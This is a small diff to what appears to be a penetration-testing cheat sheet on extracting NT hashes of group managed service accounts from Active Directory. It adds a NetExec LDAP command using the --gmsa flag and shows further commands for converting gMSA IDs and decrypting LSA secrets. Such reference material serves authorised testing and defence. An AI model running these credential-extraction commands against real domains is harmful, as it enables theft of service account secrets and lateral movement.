@@ -13,9 +13,11 @@
 
 ### Extract NT hash from the Active Directory
 
-* [netexec](https://github.com/Pennyw0rth/NetExec)
+* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
 
   ```ps1
+  netexec ldap 10.10.10.10 -u user -p pass --gmsa
+
   # Use --lsa to get GMSA ID
   netexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
   netexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
